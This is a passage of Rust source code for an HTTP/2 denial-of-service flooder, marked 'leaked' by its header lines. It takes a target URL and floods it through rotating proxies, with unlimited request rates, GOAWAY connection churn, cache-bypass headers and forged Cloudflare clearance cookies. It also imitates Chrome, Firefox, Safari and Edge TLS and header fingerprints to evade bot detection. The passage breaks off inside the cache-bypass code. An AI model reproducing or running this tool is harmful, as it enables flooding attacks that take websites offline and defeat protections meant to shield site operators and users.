//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
use bytes::Bytes;
use clap::Parser;
use colored::*;
use h2::client::{self, SendRequest};
use http::{Request, Version};
use hyper::Uri;
use rand::distributions::Alphanumeric;
use rand::Rng;
use rustls::{ClientConfig, RootCertStore, SupportedKxGroup};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::error::Error;
use std::fs;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant, SystemTime};
use tokio::time::timeout;
use tokio::io::{AsyncRead, AsyncWrite, AsyncReadExt, AsyncWriteExt};
use tokio::net::{lookup_host, TcpStream};
use tokio::sync::oneshot;
use tokio_rustls::client::TlsStream;
use tokio_rustls::TlsConnector;
use tokio::runtime::Builder as RuntimeBuilder;
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
/// HTTP/2 Flooder with Chrome Fingerprinting
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target URL (e.g., https://example.com)
    #[arg(short, long)]
    url: String,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Number of worker threads (runtime threads)
    #[arg(short = 'w', long = "workers", alias = "threads", default_value_t = 10)]
    workers: usize,

    /// Duration in seconds (0 = unlimited)
    #[arg(short, long, default_value_t = 60)]
    duration: u64,

    /// Requests per second per thread (0 = unlimited)
    #[arg(short, long, default_value_t = 0)]
    rps: u64,

    /// HTTP method
    #[arg(short, long, default_value = "GET")]
    method: String,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Custom path (overrides URL path)
    #[arg(short = 'p', long)]
    path: Option<String>,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Proxy file (format: ip:port per line, e.g., http.txt)
    #[arg(long)]
    proxy: Option<String>,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Custom cookie string to append to requests
    #[arg(long)]
    cookie: Option<String>,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Debug: print status code stats
    #[arg(long, default_value_t = false)]
    debug: bool,
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// Enable RushAway (send GOAWAY to churn connections)
    #[arg(long, default_value_t = false)]
    rushaway: bool,

    /// Aggressive cache bypass (extra headers + random query)
    #[arg(long = "cache-bypass", default_value_t = false)]
    cache_bypass: bool,

    /// Adaptive rate control when 429 received
    #[arg(long = "rate-control", default_value_t = false)]
    rate_control: bool,

    /// Enable Cloudflare cookie fingerprint (__cf_bm / cf_clearance)
    #[arg(long, default_value_t = false)]
    bfm: bool,

    /// Bypass HTTP redirects (300, 301, 302, 303, 305, 307, 308)
    #[arg(long = "bypass-redirect", default_value_t = false)]
    bypass_redirect: bool,

    /// Maximum redirect follow depth (0 = unlimited)
    #[arg(long = "max-redirects", default_value_t = 5)]
    max_redirects: u32,

    /// Use HTTP/1.1 instead of HTTP/2
    #[arg(long = "http1", default_value_t = false)]
    http1: bool,

    /// HTTP/1.1 pipelining: send N requests without waiting for response
    #[arg(long = "pipeline", default_value_t = 10)]
    pipeline: usize,

    /// Verify proxies before attack (check connectivity + skip 403 IPs)
    #[arg(long, default_value_t = false)]
    verify: bool,

    /// Blacklist proxy on 403 (skip blocked IPs during attack)
    #[arg(long, default_value_t = false)]
    skip: bool,

    /// NGENIX cache headers (nginx-like cache status simulation)
    #[arg(long = "NGENIX", default_value_t = false)]
    ngenix: bool,

    /// Enable proxy auth (format: host:port:user:pass per line)
    #[arg(long, default_value_t = false)]
    auth: bool,
}

// Browser Type Detection
#[derive(Debug, Clone, Copy, PartialEq)]
enum BrowserType {
    Chrome,
    Firefox,
    Safari,
    Edge,
}

// TLS Cipher Suites per browser
static CHROME_CIPHER_SUITES: &[rustls::SupportedCipherSuite] = &[
    rustls::cipher_suite::TLS13_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS13_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
];

static FIREFOX_CIPHER_SUITES: &[rustls::SupportedCipherSuite] = &[
    rustls::cipher_suite::TLS13_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS13_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
];

static SAFARI_CIPHER_SUITES: &[rustls::SupportedCipherSuite] = &[
    rustls::cipher_suite::TLS13_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS13_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
    rustls::cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
];

// Key exchange groups per browser
static CHROME_KX_GROUPS: &[&SupportedKxGroup] = &[
    &rustls::kx_group::X25519,
    &rustls::kx_group::SECP256R1,
    &rustls::kx_group::SECP384R1,
];

static FIREFOX_KX_GROUPS: &[&SupportedKxGroup] = &[
    &rustls::kx_group::X25519,
    &rustls::kx_group::SECP256R1,
    &rustls::kx_group::SECP384R1,
];

static SAFARI_KX_GROUPS: &[&SupportedKxGroup] = &[
    &rustls::kx_group::X25519,
    &rustls::kx_group::SECP256R1,
    &rustls::kx_group::SECP384R1,
];

// User-Agents per browser
const CHROME_USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
];

const FIREFOX_USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
];

const SAFARI_USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
];

const EDGE_USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
];

// Accept Languages
const ACCEPT_LANGUAGES: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,th;q=0.8",
    "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
];
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
// Error names to ignore (don't count as errors)
const IGNORE_NAMES: &[&str] = &[
    "RequestError", "StatusCodeError", "CaptchaError", "CloudflareError",
    "ParseError", "ParserError", "TimeoutError", "JSONError", "URLError",
    "InvalidURL", "ProxyError"
];

// Error codes to ignore (don't count as errors)
const IGNORE_CODES: &[&str] = &[
    "SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
    "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "EAI_AGAIN",
    "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND",
    "EAI_NODATA", "EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF",
    "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM",
    "EILSEQ", "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK",
    "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", "ENOENT", "ENOMEM",
    "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK", "EOPNOTSUPP",
    "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE", "EROFS", "ESHUTDOWN", "ESPIPE",
    "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT",
    "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID",
    "ERR_SOCKET_BAD_PORT"
];

// Check if error should be ignored
fn should_ignore_error(err: &(dyn Error + Send + Sync)) -> bool {
    let err_str = err.to_string();
    for name in IGNORE_NAMES {
        if err_str.contains(name) {
            return true;
        }
    }
    for code in IGNORE_CODES {
        if err_str.contains(code) {
            return true;
        }
    }
    false
}

// Simple base64 encoder for proxy auth (avoids extra dependency)
fn base64_encode(input: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(TABLE[((triple >> 18) & 0x3F) as usize] as char);
        result.push(TABLE[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(TABLE[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(TABLE[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

// Extract proxy auth from URL (supports residential proxy format: user:pass@host:port)
fn extract_proxy_auth(proxy_url: &str) -> (String, Option<String>) {
    let (scheme, without_scheme) = if let Some(rest) = proxy_url.strip_prefix("https://") {
        ("https", rest)
    } else if let Some(rest) = proxy_url.strip_prefix("socks5://") {
        ("socks5", rest)
    } else if let Some(rest) = proxy_url.strip_prefix("http://") {
        ("http", rest)
    } else {
        ("http", proxy_url)
    };
    if let Some(at_pos) = without_scheme.find('@') {
        let userinfo = &without_scheme[..at_pos];
        let hostport = &without_scheme[at_pos + 1..];
        let encoded = base64_encode(userinfo.as_bytes());
        let auth = format!("Basic {}", encoded);
        let clean_url = format!("{}://{}", scheme, hostport);
        (clean_url, Some(auth))
    } else {
        (proxy_url.to_string(), None)
    }
}
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
struct Stats {
    requests: AtomicU64,
    bytes_sent: AtomicU64,
    errors: AtomicU64,
    status_counts: Mutex<HashMap<u16, u64>>,
}
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
impl Stats {
    fn new() -> Self {
        Self {
            requests: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            status_counts: Mutex::new(HashMap::new()),
        }
    }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    fn inc_requests(&self) {
        self.requests.fetch_add(1, Ordering::Relaxed);
    }

    fn inc_bytes(&self, n: u64) {
        self.bytes_sent.fetch_add(n, Ordering::Relaxed);
    }

    fn inc_errors(&self) {
        self.errors.fetch_add(1, Ordering::Relaxed);
    }

    fn inc_status(&self, code: u16) {
        if let Ok(mut map) = self.status_counts.lock() {
            *map.entry(code).or_insert(0) += 1;
        }
    }
}

struct RateControl {
    enabled: bool,
    backoff_ms: AtomicU64,
    until_ms: AtomicU64,
}

impl RateControl {
    fn new(enabled: bool) -> Self {
        Self {
            enabled,
            backoff_ms: AtomicU64::new(1_000),
            until_ms: AtomicU64::new(0),
        }
    }

    fn now_ms() -> u64 {
        SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64
    }

    /// Check if currently rate-limited (should block new connections)
    fn is_rate_limited(&self) -> bool {
        if !self.enabled {
            return false;
        }
        let now = Self::now_ms();
        let until = self.until_ms.load(Ordering::Relaxed);
        until > now
    }

    /// Wait until no longer rate-limited, then return
    async fn wait_if_rate_limited(&self) {
        if !self.enabled {
            return;
        }
        loop {
            let now = Self::now_ms();
            let until = self.until_ms.load(Ordering::Relaxed);
            if until <= now {
                break;
            }
            let wait = until - now;
            // Sleep in chunks to allow checking for updated until_ms
            let sleep_chunk = wait.min(500);
            tokio::time::sleep(Duration::from_millis(sleep_chunk)).await;
        }
    }

    fn mark_429(&self, retry_after: Option<u64>) {
        if !self.enabled {
            return;
        }
        let current = self.backoff_ms.load(Ordering::Relaxed);
        // Exponential backoff: double the current backoff, max 30 seconds
        let mut cooldown = (current * 2).min(30_000);
        if let Some(header_ms) = retry_after {
            // Use Retry-After header if larger, but cap at 120 seconds
            cooldown = cooldown.max(header_ms.min(120_000));
        }
        let now = Self::now_ms();
        self.backoff_ms.store(cooldown, Ordering::Relaxed);
        self.until_ms
            .store(now.saturating_add(cooldown), Ordering::Relaxed);
    }

    fn decay(&self) {
        if !self.enabled {
            return;
        }
        let now = Self::now_ms();
        let until = self.until_ms.load(Ordering::Relaxed);
        // Only decay if we're no longer in cooldown
        if now > until {
            let current = self.backoff_ms.load(Ordering::Relaxed);
            if current > 1_000 {
                let new_val = (current / 2).max(1_000);
                self.backoff_ms.store(new_val, Ordering::Relaxed);
            }
        }
    }

}

// ── NGENIX cache simulation (ported from SILENA-v7.go) ──
struct NgenixCacheEntry {
    etag: String,
    updated_at: Instant,
}

struct NgenixCache {
    entries: Mutex<HashMap<String, NgenixCacheEntry>>,
}

impl NgenixCache {
    fn new() -> Self {
        NgenixCache {
            entries: Mutex::new(HashMap::new()),
        }
    }

    fn gen_etag(key: &str) -> String {
        let nanos = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let input = format!("{}:{}", key, nanos);
        let mut hasher = Sha256::new();
        hasher.update(input.as_bytes());
        let result = hasher.finalize();
        // Use first 16 bytes (like MD5 length) for compact etag
        hex::encode(&result[..16])
    }

    /// Fetch cache status + etag for a resource key (like Go's NgenixCache.Fetch)
    fn fetch(&self, key: &str) -> (String, String) {
        let now = Instant::now();
        let mut rng = rand::thread_rng();
        let mut entries = self.entries.lock().unwrap();

        if let Some(entry) = entries.get(key) {
            let age = now.duration_since(entry.updated_at);
            if age <= Duration::from_secs(20) {
                return ("HIT".to_string(), entry.etag.clone());
            }
            if age <= Duration::from_secs(79) {
                if rng.gen_bool(0.3) {
                    let etag = Self::gen_etag(key);
                    entries.insert(key.to_string(), NgenixCacheEntry {
                        etag: etag.clone(),
                        updated_at: now,
                    });
                    return ("UPDATING".to_string(), etag);
                }
                return ("STALE".to_string(), entry.etag.clone());
            }
            let etag = Self::gen_etag(key);
            entries.insert(key.to_string(), NgenixCacheEntry {
                etag: etag.clone(),
                updated_at: now,
            });
            return ("EXPIRED".to_string(), etag);
        }

        let etag = Self::gen_etag(key);
        entries.insert(key.to_string(), NgenixCacheEntry {
            etag: etag.clone(),
            updated_at: now,
        });
        ("MISS".to_string(), etag)
    }
}

/// Extract path from URL for NGENIX cache key (like Go's ngenixResourceKey)
fn ngenix_resource_key(url_str: &str) -> String {
    if let Ok(uri) = url_str.parse::<Uri>() {
        let p = uri.path();
        if p.is_empty() { "/".to_string() } else { p.to_string() }
    } else {
        url_str.to_string()
    }
}

// Randomly select a browser type
fn get_random_browser() -> BrowserType {
    let mut rng = rand::thread_rng();
    match rng.gen_range(0..4) {
        0 => BrowserType::Chrome,
        1 => BrowserType::Firefox,
        2 => BrowserType::Safari,
        _ => BrowserType::Edge,
    }
}

// Get user agent for specific browser
fn get_user_agent_for_browser(browser: BrowserType) -> &'static str {
    let mut rng = rand::thread_rng();
    match browser {
        BrowserType::Chrome => CHROME_USER_AGENTS[rng.gen_range(0..CHROME_USER_AGENTS.len())],
        BrowserType::Firefox => FIREFOX_USER_AGENTS[rng.gen_range(0..FIREFOX_USER_AGENTS.len())],
        BrowserType::Safari => SAFARI_USER_AGENTS[rng.gen_range(0..SAFARI_USER_AGENTS.len())],
        BrowserType::Edge => EDGE_USER_AGENTS[rng.gen_range(0..EDGE_USER_AGENTS.len())],
    }
}

// Detect browser type from user agent string
fn detect_browser_from_ua(user_agent: &str) -> BrowserType {
    if user_agent.contains("Edg/") {
        BrowserType::Edge
    } else if user_agent.contains("Firefox/") {
        BrowserType::Firefox
    } else if user_agent.contains("Safari/") && !user_agent.contains("Chrome/") {
        BrowserType::Safari
    } else {
        BrowserType::Chrome
    }
}

fn get_random_accept_language() -> &'static str {
    let mut rng = rand::thread_rng();
    ACCEPT_LANGUAGES[rng.gen_range(0..ACCEPT_LANGUAGES.len())]
}

fn now_timestamp_string() -> String {
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(dur) => dur.as_millis().to_string(),
        Err(_) => "0".to_string(),
    }
}

fn sha256_hex(input: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input);
    let digest = hasher.finalize();
    hex::encode(digest)
}

fn generate_cf_cookies(ts: &str) -> Vec<(String, String)> {
    let mut rng = rand::thread_rng();
    let mut nonce = [0u8; 16];
    rng.fill(&mut nonce);
    let nonce_hex = hex::encode(nonce);

    let clearance_seed = format!("{}:{}", ts, nonce_hex);
    let clearance = format!("{}-{}", ts, sha256_hex(clearance_seed.as_bytes()));

    let bm_seed = format!("bm:{}:{}", ts, nonce_hex);
    let bm = sha256_hex(bm_seed.as_bytes());

    vec![
        ("cf_clearance".to_string(), clearance),
        ("__cf_bm".to_string(), bm),
    ]
}

fn join_cookie_header(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("; ")
}

fn extract_chrome_major(user_agent: &str) -> Option<&str> {
    user_agent.split("Chrome/").nth(1)?.split('.').next()
}

fn detect_platform(user_agent: &str) -> &str {
    if user_agent.contains("Windows") {
        "Windows"
    } else if user_agent.contains("Macintosh") {
        "macOS"
    } else if user_agent.contains("X11; Linux") || user_agent.contains("Linux") {
        "Linux"
    } else {
        "Linux"
    }
}

// Generate Chrome-like headers with proper order
fn random_alphanum(len: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

fn _random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!(
        "{}.{}.{}.{}",
        rng.gen_range(1..255),
        rng.gen_range(0..255),
        rng.gen_range(0..255),
        rng.gen_range(1..255)
    )
}

fn generate_browser_headers(user_agent: &str, accept_lang: &str, cache_bypass: bool) -> Vec<(String, String)> {
    let mut headers = Vec::new();
    let mut rng = rand::thread_rng();
    let browser = detect_browser_from_ua(user_agent);
    let platform = detect_platform(user_agent);

    // Generate headers based on browser type
    match browser {
        BrowserType::Chrome | BrowserType::Edge => {
            let chrome_major = extract_chrome_major(user_agent).unwrap_or("120");
            
            headers.push(("cache-control".to_string(), "max-age=0".to_string()));
            headers.push((
                "sec-ch-ua".to_string(),
                if browser == BrowserType::Edge {
                    format!(
                        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"{}\", \"Microsoft Edge\";v=\"{}\"",
                        chrome_major, chrome_major
                    )
                } else {
                    format!(
                        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"{}\", \"Google Chrome\";v=\"{}\"",
                        chrome_major, chrome_major
                    )
                },
            ));
            headers.push(("sec-ch-ua-mobile".to_string(), "?0".to_string()));
            headers.push((
                "sec-ch-ua-platform".to_string(),
                format!("\"{}\"", platform),
            ));
            
            // Randomly add sec-ch-ua-* headers for more diversity
            if rng.gen_bool(0.7) {
                headers.push(("sec-ch-ua-arch".to_string(), "\"x86\"".to_string()));
            }
            if rng.gen_bool(0.6) {
                headers.push(("sec-ch-ua-bitness".to_string(), "\"64\"".to_string()));
            }
            if rng.gen_bool(0.5) {
                headers.push(("sec-ch-ua-full-version-list".to_string(), 
                    format!("\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{}.0.0.0\", \"Google Chrome\";v=\"{}.0.0.0\"", 
                        chrome_major, chrome_major)));
            }
            if rng.gen_bool(0.4) {
                headers.push(("sec-ch-ua-model".to_string(), "\"\"".to_string()));
            }
            if rng.gen_bool(0.3) {
                headers.push(("sec-ch-ua-platform-version".to_string(), "\"15.0.0\"".to_string()));
            }
            
            headers.push(("upgrade-insecure-requests".to_string(), "1".to_string()));
            headers.push(("user-agent".to_string(), user_agent.to_string()));
            headers.push((
                "accept".to_string(),
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7".to_string(),
            ));
            headers.push(("sec-fetch-site".to_string(), "none".to_string()));
            headers.push(("sec-fetch-mode".to_string(), "navigate".to_string()));
            headers.push(("sec-fetch-user".to_string(), "?1".to_string()));
            headers.push(("sec-fetch-dest".to_string(), "document".to_string()));
            headers.push(("accept-encoding".to_string(), "gzip, deflate, br, zstd".to_string()));
            headers.push(("accept-language".to_string(), accept_lang.to_string()));
        }
        BrowserType::Firefox => {
            headers.push(("user-agent".to_string(), user_agent.to_string()));
            headers.push((
                "accept".to_string(),
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8".to_string(),
            ));
            headers.push(("accept-language".to_string(), accept_lang.to_string()));
            headers.push(("accept-encoding".to_string(), "gzip, deflate, br".to_string()));
            
            if rng.gen_bool(0.5) {
                headers.push(("dnt".to_string(), "1".to_string()));
            }
            
            headers.push(("connection".to_string(), "keep-alive".to_string()));
            headers.push(("upgrade-insecure-requests".to_string(), "1".to_string()));
            headers.push(("sec-fetch-dest".to_string(), "document".to_string()));
            headers.push(("sec-fetch-mode".to_string(), "navigate".to_string()));
            headers.push(("sec-fetch-site".to_string(), "none".to_string()));
            headers.push(("sec-fetch-user".to_string(), "?1".to_string()));
            
            if rng.gen_bool(0.3) {
                headers.push(("te".to_string(), "trailers".to_string()));
            }
        }
        BrowserType::Safari => {
            headers.push(("accept".to_string(), 
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string()));
            headers.push(("sec-fetch-site".to_string(), "none".to_string()));
            headers.push(("accept-encoding".to_string(), "gzip, deflate, br".to_string()));
            headers.push(("sec-fetch-mode".to_string(), "navigate".to_string()));
            headers.push(("user-agent".to_string(), user_agent.to_string()));
            headers.push(("accept-language".to_string(), accept_lang.to_string()));
            headers.push(("sec-fetch-dest".to_string(), "document".to_string()));
            
            if user_agent.contains("iPhone") || user_agent.contains("iPad") {
                headers.push(("sec-fetch-user".to_string(), "?1".to_string()));
            }
        }
    }

    // Add common additional headers for diversity
    if rng.gen_bool(0.4) {
        headers.push(("dnt".to_string(), "1".to_string()));
    }
    
    if rng.gen_bool(0.3) {
        let viewports = ["980", "1024", "1280", "1366", "1440", "1920", "2560"];
        headers.push(("viewport-width".to_string(), 
            viewports[rng.gen_range(0..viewports.len())].to_string()));
    }
    
    if rng.gen_bool(0.25) {
        headers.push(("device-memory".to_string(), 
            ["2", "4", "8", "16"][rng.gen_range(0..4)].to_string()));
    }
    
    if rng.gen_bool(0.2) {
        headers.push(("downlink".to_string(), 
            format!("{:.1}", rng.gen_range(1.0..10.0))));
    }
    
    if rng.gen_bool(0.2) {
        headers.push(("ect".to_string(), 
            ["2g", "3g", "4g"][rng.gen_range(0..3)].to_string()));
    }
    
    if rng.gen_bool(0.15) {
        headers.push(("rtt".to_string(), 
            rng.gen_range(20..200).to_string()));
    }
    
    if rng.gen_bool(0.35) {
        headers.push(("save-data".to_string(), "on".to_string()));
    }

    // Cache bypass headers (ported from SILENA-v7.go applyCacheBypassHeaders)
    if cache_bypass {
        // ── 1. Cache-Control rotation ──
        let cache_control_variants = [
            "no-cache, no-store, must-revalidate, max-age=0",
            "no-cache, no-store, private, max-age=0",
